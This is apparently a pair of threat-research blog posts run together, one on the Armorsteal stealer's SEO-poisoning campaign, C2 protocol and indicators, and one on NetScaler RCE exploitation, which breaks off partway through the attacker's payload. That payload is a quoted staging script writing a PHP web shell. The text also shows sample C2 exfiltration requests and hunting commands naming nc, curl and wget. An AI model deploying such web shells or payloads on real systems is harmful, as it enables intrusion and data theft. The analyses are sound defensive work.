IntroductionIn September 2026, Zscaler Threat Hunting identified an SEO poisoning campaign that used fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware family we track as&nbsp;Armorsteal. The fake websites targeted users searching for Chocolatey or MAS software installation commands. Each lure page displayed a malicious PowerShell command that downloaded and executed the Armorsteal installer. The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor.The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data.In this blog post, the Zscaler Threat Hunting team traces the campaign from poisoned search results through post-infection activity, including Armorsteal's components, C2 communication, and infrastructure changes observed during our analysis. Key TakeawaysIn September 2026, the Zscaler Threat Hunting team identified an SEO poisoning campaign that distributed Armorsteal through websites impersonating Chocolatey and the Microsoft Activation Scripts (MAS) tool.The SEO campaign targeted users searching for Chocolatey installation instructions or Microsoft activation scripts.The remote access component verifies RSA-2048 signatures on Python tasks received from the C2 server before executing them.The surveillance component records window titles, logs keystrokes, monitors copied cryptocurrency wallet addresses, and captures screenshots when configured keywords are detected.The information stealing component steals Discord tokens, browser cookies, saved passwords, cryptocurrency wallet data, BIP39 seed phrases, and SSH keys. Technical AnalysisThe following sections provide details about the malware distribution, capabilities, and network communications.SEO poisoningZscaler Threat Hunting identified two SEO poisoning lures that targeted users searching for Windows software installation instructions. One of those lures is shown in the figure below.Figure 1: Google search results for “chocolatey install windows”.&nbsp;Fake Chocolatey websiteThe first lure (seen in Figure 1) targets users looking for the Chocolatey package manager. A user searching for terms such as “install Chocolatey” and “Chocolatey PowerShell” may reach a typosquatted site impersonating chocolatey[.]org. The site displays a PowerShell installation command. When the user runs it, the malicious&nbsp;install.ps1 script downloads and installs the remote access module. The script also runs the legitimate Chocolatey installer, so Chocolatey appears to function as expected. The fake Chocolatey website and the malicious domain,&nbsp;choclatey[.]org, are shown below:Figure 2: Fake Chocolatey website distributing Armorsteal.&nbsp;Fake Massgrave websiteThe second lure targeted users searching for terms such as “Microsoft Activation Scripts,” “MAS activation script,” or “Massgrave activation”. These users may have reached&nbsp;massgravel[.]net, a malicious website impersonating the&nbsp;Microsoft Activation Scripts tool (a.k.a., the Massgrave project). The fake Massgrave website is shown in the figure below:Figure 3: Fake Massgrave website distributing Armorsteal.Although the two websites impersonate different projects and target different search queries, both deliver Armorsteal.ANALYST NOTE: The fake Massgrave website went down on September 25, 2026, and the fake Chocolatey website went down around October 1, 2026.&nbsp;Installation and persistenceBoth installer variants request elevated privileges, hide the PowerShell console window, and download a ZIP archive to&nbsp;C:\Windows\SystemHealth\Update\ to mimic a legitimate Windows system directory. The archive contains a Python 3.11 runtime, Pyarmor runtime files, and Armorsteal Python-based scripts.The installer creates the following scheduled tasks for persistence:Scheduled taskTriggerDescriptionSysCheck2User logonLaunches the remote access module with the highest privileges available.SysCheckXSystem bootLaunches the remote access module as SYSTEM after a 45-second delay.Table 1: Armorsteal scheduled task persistence.Anti-analysis techniquesArmorsteal uses the following techniques to avoid research environments and complicate analysis:The remote access module checks the public IP address and organization information using&nbsp;ipinfo[.]io. If the organization name returned matches a cloud provider such as Google, Amazon, Microsoft, or Azure, the module displays a fake “Memory is insufficient” message and exits. This can prevent the malware from running in some cloud-based analysis environments.The Python scripts are protected with Pyarmor 9.1.7 (trial version). Pyarmor encrypts Python bytecode and string constants, making static analysis and detection more difficult. The trial runtime is operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license.Remote access moduleThe Armorsteal remote access module is stored as&nbsp;SysMon.py and is launched by the&nbsp;SysCheck2 and&nbsp;SysCheckX scheduled tasks. The module collects information about the infected system, including the hostname, operating system, processor, memory, disks, local IP address, public IP address, and network interfaces. It uses the motherboard serial number to create a machine identifier used in C2 communication.The remote access module also downloads and launches the surveillance and information stealing modules.&nbsp;The remote access module uses HTTPS and a hardcoded list of four C2 domains. It checks the availability of each domain before starting C2 communication. The C2 endpoints supported by the remote access module are shown in the table below:EndpointMethodDescription/downloadables/configf.jsonGETChecks whether the C2 server is available based on the HTTP status code 200./receive_infofPOSTSends device information to the C2 server./get-onetime-code/{machine_id}GETRequests a task for an individual victim./get-globalGETRequests a task shared across all infected systems./downloadables/{archive}GETIn earlier builds, downloads the remote access module updates along with the surveillance and information stealing modules.Table 2: The remote access module C2 endpoints.The following example shows the format of the HTTP POST request the remote access module uses to send system information to its C2 server.&nbsp;POST /receive_infof HTTP/1.1
Host: workerstats[.]net
User-Agent: python-requests/2.31.0
Content-Type: application/json
Content-Length: {CONTENT_LENGTH}

{
 "host_name": "{HOSTNAME}",
 "ip_address": "{LOCAL_IP}",
 "public_ip_address": "{PUBLIC_IP}",
 "mac_address": "{MAC_ADDRESS}",
 "system": "{WINDOWS_VERSION}",
 "machine": "{MACHINE_ARCHITECTURE}",
 "memory": {
   "total": {TOTAL_MEMORY_SIZE},
   "available": {AVAILABLE_MEMORY_SIZE},
   "percent": {MEMORY_PERCENTAGE}
 }
}The C2 server responds with the following message:{"message":"Data received and stored successfully"}The remote access module polls its C2 server every 60 seconds for both per-victim and global tasks. The malware verifies every task received using an embedded RSA-2048 public key before executing it. The per-victim task endpoint returns JSON containing Python code and a Base64-encoded signature, as shown in the format below:{
 "code": "&lt;Python source code&gt;",
 "sig": "&lt;Base64-encoded RSA signature&gt;"
}The global task endpoint returns a different response containing the # _ _SIGNED _ _: marker followed by the task data:# _ _SIGNED_ _:{"code":"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNz...",
"sig":"fdWOAiJJ7qIowDnCEgO4LDd+s19RzzBjnKFQ9K447GXj..."}The remote access module uses a custom RSASSA-PKCS1-v1_5 signature verification routine before executing the task’s code in memory. After verifying a task's signature, it extracts an integer version number embedded in the Python code:&nbsp;ONETIME_VERSION for per-victim tasks and&nbsp;GLOBAL_VERSION&nbsp;for global tasks. The module compares this task version number with the last successfully executed version stored locally in its working directory,&nbsp;C:\Windows\SystemHealth\Update\. Task version numbers specific to a victim are stored in&nbsp;onetime_version.txt&nbsp;and global task versions are recorded in&nbsp;global_version.txt. The malware executes a task in memory only when its version is greater than the value in the corresponding file. The version number is then updated in the corresponding file. This prevents previously processed or older tasks from running again.The Armorsteal remote access module can also update itself through global tasks. These tasks can direct the malware to download a replacement&nbsp;SysMon.py file. The module first verifies the SHA256 of the downloaded file before replacing its local copy. This capability allows the threat actor to update the malware's embedded C2 domain list and configuration.Surveillance moduleThe surveillance component is named&nbsp;basrq.py and runs in a separate bundled Python interpreter in a ZIP archive, which is downloaded by the remote access module.The surveillance module performs the following activities:Logs keystrokes (with specialized handling for English, French, Spanish, and German), including backspace, space, decimal separators, and modifier keys.Records the title of the active window along with captured keystrokes.Monitors clipboard content every 0.5 seconds.Replaces copied cryptocurrency wallet addresses with attacker-controlled addresses.Captures screenshots when configured keywords appear in window titles or captured keystrokes.Displays fake transaction notifications that impersonate Exodus, MetaMask, and Phantom.The clipboard hijacker supports wallet addresses for Bitcoin, Litecoin, Monero, Ethereum, TRON, XRP, Dogecoin, TON, and Solana.The Armorsteal surveillance module uses the following C2 endpoints to retrieve monitoring keywords and upload collected data.EndpointMethodDescription/global_keywordsGETRetrieves campaign-wide monitoring keywords./keywords/{machine_id}GETRetrieves keywords for a specific infected system./black-watch/{machine_id}POSTUploads gzip-compressed keystroke logs./black-watch/screenshot/{machine_id}POSTUploads keyword-triggered screenshots.Table 3: The Armorsteal surveillance module C2 endpoints.The module retrieves keyword lists every 300 seconds. The observed lists include terms related to cryptocurrency wallets, exchanges, browser names, cloud services, and recovery phrase-related terms. Before uploading screenshots to&nbsp;/black-watch/screenshot/{machine_id}, the surveillance module encrypts their raw PNG bytes. The module computes the SHA256 digest of a hardcoded string and uses the resulting 32-byte value (c1146fbcaa433385839c25839a61cd7fedaff858cc0d3fd063dba68db2cf31b4) as an XOR key.The following example shows the Armorsteal surveillance module uploading the stolen data using the filename&nbsp;keylogs.gz:POST /black-watch/{machine_id} HTTP/1.1
Host: workerstats[.]net

Content-Type: multipart/form-data
Content-Disposition: form-data; name="keylogs"; filename="keylogs.gz"

&lt;gzip-compressed log data&gt;Stealer moduleThe information stealing module’s script name is got.py, which is downloaded as a ZIP archive by the remote access module. This module collects data from web browsers, password managers, cryptocurrency wallets, Discord clients, and Steam installations. The stealer also collects system information, including geolocation, display information, language settings, time zone, and GPU details.The stealer module has the following capabilities:Steals and validates Discord tokens from 22 Discord client variants.Collects data from 21 browser wallet extensions and desktop wallet applications.Searches drives from A: through Z: for BIP39 seed phrases.Extracts browser cookies through the Chrome DevTools Protocol (CDP) on port 9222.Steals saved browser passwords, autofill data, and credit card metadata. To collect browser passwords, the module downloads and uses the public chrome-decryptor tool from the Chrome App-Bound Encryption Decryption project.Targets password manager data from KeePass, 1Password, RoboForm, Password Safe, Enpass, Bitwarden, and Dashlane.Collects SSH keys and Steam session data.The Armorsteal stealer module uses the following C2 endpoints to upload stolen data:&nbsp;EndpointMethodDescription/infame/receive/zipPOSTUploads the main stolen data archive./infame/receive/dtPOSTUploads Discord tokens and account information./ws/{machine_id}POSTUploads wallet files and seed phrases./pwdPOSTUploads saved browser passwords./upload/stPOSTUploads Steam account information.Table 4: Armorsteal stealer module C2 endpoints.The main information stealing component archive contains a system profile and browser cookie files. Threat Actor InfrastructureZscaler Threat Hunting identified Armorsteal lure and C2 domains registered on the dates shown in the table below. Shared malware components and an RSA-2048 task-signing key link the Chocolatey and Massgrave lures to the same operation.DomainPurposeRegistration DateRegistrarworkerstats[.]netPrimary C2January 28, 2026NICENICdatamons[.]orgStandby C2May 19, 2026NameSilosupertrap[.]netStandby C2August 29, 2026NameSilomassgravel[.]netFake Massgrave lureAugust 30, 2026NICENICchoclatey[.]orgFake Chocolatey lureSeptember 1, 2026Key-Systemsniceer[.]netStandby C2September 1, 2026NICENICTable 5: Armorsteal lure and C2 domain registration details.Zscaler Threat Hunting observed two phases of the campaign’s infrastructure changes during the analysis period. In the first phase (early September 2026), the fake Chocolatey website and its subdomains were hosted at&nbsp;209.99.186[.]187, an SKN Subnet &amp; Telecom server. At this time,&nbsp;workerstats[.]net was protected by Cloudflare and resolved to&nbsp;104.21.87[.]146.In mid-September 2026, the operator moved the Chocolatey and Massgrave lure websites to&nbsp;82.153.135[.]80, hosted by AKILE LTD in the United Kingdom. The primary C2 domain,&nbsp;workerstats[.]net, also moved from Cloudflare to&nbsp;186.2.175[.]183, hosted by IQWeb FZ-LLC and using DDoS-Guard name servers.During continued monitoring (early October 2026), Zscaler Threat Hunting observed further changes to Armorsteal’s C2 infrastructure. The previously used domain,&nbsp;workerstats[.]net, became unavailable, and the threat actor began using&nbsp;pymons[.]is and the previously dormant domain datamons[.]org as C2 servers.&nbsp;The threat actor subsequently changed how the surveillance and information stealing modules were downloaded. Previously accessible through the C2 server’s&nbsp;/downloadables/ path, the packages now require a token in the request URL and an&nbsp;X-Verify header containing the correct token. Requests use&nbsp;/C2/?t=[token]451 for surveillance and&nbsp;/C2/?t=[token]452 for information stealing. Successful requests retrieve ZIP packages from&nbsp;/p/[32hex].zip, with randomized filenames.&nbsp; Remediations And Detection OpportunitiesFor organizations that suspect exposure to this campaign, we recommend the following actions:Investigate systems for&nbsp;SysCheck2 and&nbsp;SysCheckX scheduled tasks.Hunt for files and directories under&nbsp;C:\Windows\SystemHealth\Update\.Review PowerShell logs for downloads from&nbsp;choclatey[.]org,&nbsp;community[.]choclatey[.]org, and&nbsp;massgravel[.]net.Block the verified malicious lures and C2 domains.Review outbound HTTPS traffic for&nbsp;/receive_infof, /get-global, /black-watch/, and /infame/receive/ where URL paths are visible in your telemetry.Review endpoint telemetry for browser processes started with&nbsp;--remote-debugging-port=9222.Remove unauthorized Microsoft Defender exclusions, particularly exclusions for&nbsp;C:\Windows.Educate users to verify software download websites and PowerShell installation commands before execution. ConclusionArmorsteal is a Python-based malware family distributed through an active SEO poisoning campaign that uses fake Chocolatey and Massgrave websites. The campaign deploys modules for remote access, cryptocurrency theft, clipboard hijacking, and credential stealing. The shared malware components, task-signing key, and C2 infrastructure link both lures to the same operation. Although the operator changed hosting and package filenames during our analysis, the core malware components remained unchanged. The Zscaler Threat Hunting team continues to monitor the campaign for infrastructure and payload changes. Zscaler CoverageZscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels. The figure below depicts the Zscaler Cloud Sandbox, showing detection details for Armorsteal.Figure 4: Zscaler Cloud Sandbox report for Armorsteal.In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels with the following threat names:PS.Dropper.ArmorstealPython.PWS.ArmorstealZscaler MDR detects this threat with these detection analytics:WIN-CONHOST-HEADLESS-CMDWIN-SCHTASKS-CREATE-SHELLWIN-PYTHON-CHROMIUM-HEADLESS Indicators Of Compromise (IOCs)File indicatorsSHA256FilenameDescriptionf3846ec2a6ff0a27d9ef2b9bf7908743b81d295ef29344acfb96ff83fff994f9install.ps1MAS lure installerfb1181160e9f10ce1eb5e5dc9bc23e1498a39110ee9ea361fd150454cb01b292install.ps1Chocolatey lure installer3e3b62a9836697d978cbb620dc8af8f6eefdf8cb73fc30d16bb394d1c58f4c97Update.zip / Updatef.zipRemote access module237ba698d7dc8936c43e0e78e7644002375e51e8baf9b3a7d4e18683f871ee31nig20084.zipSurveillance modulebe0329d0795dd62ae587faf97e704bb36413e5c98ddd8fe575f5077db3c84e5fgetthem20084.zipStealer module&nbsp;04d2828155ed2a276cfd3c97d4f966d328391dd818e04e773212cd601e49fa74nig20083.zipOlder stealer module56f05c4fb1c25c04e0dde60e2e5e41ac164a6dc53688d0f9eb52a55f82106389getthem20083.zipOlder stealer module0ea99fbbe29af6f797e3866ed5f822c7a5d3e9cdb990a8c382a715069f156499SysMon.pyRemote access module8fb7aaf2b9270b8b75f6844aaefd5242b4f926fb89cba10fff3d9b908a769788basrq.pySurveillance module5410c2f239c3649928383c4478dea182f90b21f5b258081fec07e9d297ae4b1cgot.pyStealer moduleNetwork indicatorsIndicatorTypechoclatey[.]orgFake Chocolatey domainmassgravel[.]netFake MAS domainworkerstats[.]netC2 domainpymons[.]isC2 domaindatamons[.]orgInitially standby C2; later activeniceer[.]netsupertrap[.]netStandby C282[.]153[.]135[.]80Payload host186[.]2[.]175[.]183C2 IP address186[.]2[.]163[.]185C2 IP address190[.]115[.]31[.]69C2 IP address209[.]99[.]186[.]187Payload host

IntroductionOn September 27, 2026, Citrix disclosed&nbsp;CVE-2026-88771, a critical remote code execution (RCE) vulnerability affecting NetScaler Application Delivery Controller (ADC) and NetScaler Gateway. The vulnerability carries a CVSS v3.1 score of 9.8 according to&nbsp;NVD and a CVSS v4.0 score of 9.5 according to the&nbsp;Citrix security bulletin CTX697096. The vulnerability allows unauthenticated attackers to execute arbitrary commands on affected appliances. Exploitation requires no optional features to be enabled.Citrix confirmed exploitation on unmitigated appliances, and the US’s Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-88771 to its&nbsp;Known Exploited Vulnerabilities catalog following reports of active exploitation worldwide. Citrix has since disclosed another critical vulnerability affecting NetScaler ADC and NetScaler Gateway,&nbsp;CVE-2026-107406, which can lead to RCE or denial of service. CVE-2026-107406 affects appliances configured as SAML service provider or identity provider depending on the software version. The analysis in this blog focuses on the exploitation of CVE-2026-88771.Zscaler ThreatLabz observed a staged exploitation chain involving access-log poisoning, remote command execution before authentication, appliance fingerprinting, and attempts to deploy multiple web shells. ThreatLabz also observed delivery of a FreeBSD x64 implant from infrastructure that overlapped with activity we previously associated with exploitation of StyleSmuggler (CVE-2026-75650), a vulnerability affecting Adobe Commerce and Magento.This overlap provides an investigative lead but does not establish threat actor attribution. Shared hosting and compromised infrastructure, malware distribution services, or payload reuse by unrelated operators could explain the connection. Fixed ReleasesCitrix recommends installing the following builds or later:Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.46 and later releasesCitrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.29 and later releases of 13.1Citrix NetScaler ADC 14.1-FIPS 14.1-73.46 FIPS and later releases of 14.1-FIPSCitrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.283 and later releases of 13.1-FIPS and 13.1-NDcPP RecommendationsOrganizations running NetScaler ADC or NetScaler Gateway should take the following actions immediately:Identify exposed appliances: Inventory every NetScaler appliance and determine its software version, build, and internet exposure.Preserve forensic evidence before updating: Capture a virtual machine snapshot, where applicable, and collect remote syslog data, the NetScaler technical support bundle, and available packet-engine core dumps. CISA warns that updating may remove or reduce forensic visibility.Isolate potentially compromised appliances: Remove potentially compromised appliances from untrusted networks while preserving evidence.Mitigation and response: If your environment includes any of the impacted appliances, it is advisable to proactively hunt for signs of compromise. The following commands, sourced from&nbsp;Sh3llc0de, can help identify suspicious activity.To investigate modifications within the FreeBSD shell, access the NetScaler console, enter&nbsp;shell, and run the commands below:#1. Inspect running processes for suspicious shells spawned by nsppe
ps aux | grep -E "sh|bash|python|perl|nc|curl|wget" | grep -v "nsconmsg"

# 2. Check startup script rc.netscaler for unauthorized modifications
cat /flash/nsconfig/rc.netscaler

# 3. Audit cron jobs for suspicious automated scripts
crontab -l
cat /etc/crontab

# 4. Search for newly created or modified web files in webroot directories
find /netscaler/ns_gui/ -type f -mtime -3
find /var/netscaler/gui/ -type f -mtime -3

# 5. Review HTTP error logs for abnormal crash dumps or core files
ls -la /var/crash/
ls -la /var/core/To determine whether any unauthorized child shells have been launched under the&nbsp;/nobody/&nbsp;service account, run the following:# Inspect active processes spawned by the nobody service context
ps aux | grep -E "(sh|bash|python|perl|nc)"

# Audit active network listening sockets for unmapped ports
netstat -an | grep LISTENCheck configuration integrity: Compare&nbsp;/etc/httpd.conf, any included configuration files, and other appliance configuration files with those on a known-good system. Pay particular attention to unexpected PHP or CGI enablement.Search for known access paths: Search HTTP access logs for paths/URIs consistent with GET request paths associated with this CVE.Search for staged payloads: Look for User-Agent values of&nbsp;INDEX: followed by Base64-encoded content in HTTP access logs.Search for forged failure messages: Review authentication and system logs for fabricated&nbsp;pitboss PPE messages containing shell syntax.Review outbound connections: Investigate appliance-initiated connections, especially downloads from unfamiliar IP addresses.Rotate exposed secrets after containment: If compromise is confirmed, rotate credentials, tokens, certificates, and other secrets stored on or accessible through the appliance.Upgrade to a fixed release: Install the applicable Citrix build listed above. Attack ChainThe figure below illustrates how attackers exploit CVE-2026-88771 to gain initial access to NetScaler appliances.Figure 1: Attack chain exploiting CVE-2026-88771 to compromise NetScaler appliances. How It WorksThreatLabz discovered a staged log-poisoning chain. The attacker staged a larger post-exploitation payload separately from the shorter command used to trigger its execution.This behavior is consistent with independent technical analysis published by&nbsp;CERT-EU and&nbsp;Unit 42. Step 1: Staging the payload in the HTTP access logThe attacker sent GET requests to common NetScaler paths, as listed below:/logon/LogonPoint/tmindex.html/logon/LogonPoint/index.html/vpn/index.html/logon/tmindex.htmlThe requests carried a distinctive User-Agent value:User-Agent: INDEX: Base64 payload:mkdir -p /var/vpn/bookmark/ /netscaler/ns_gui/vpn/ /var/netscaler/gui/vpn/ /var/netscaler/logon/LogonPoint/ /var/vpn/theme/ /var/netscaler/gui/admin_ui/apex/;

echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /var/vpn/bookmark/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /netscaler/ns_gui/vpn/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /var/netscaler/gui/vpn/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /var/netscaler/logon/LogonPoint/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /var/vpn/theme/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2&gt;/dev/null || head -1 /nsconfig/ns.conf 2&gt;/dev/null)" &gt; /var/netscaler/gui/admin_ui/apex/Nx_7508.html; 

echo '&lt;?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?&gt;' &gt; /var/vpn/bookmark/Nx_7508.php; chmod 755 /var/vpn/bookmark/Nx_7508.php; 
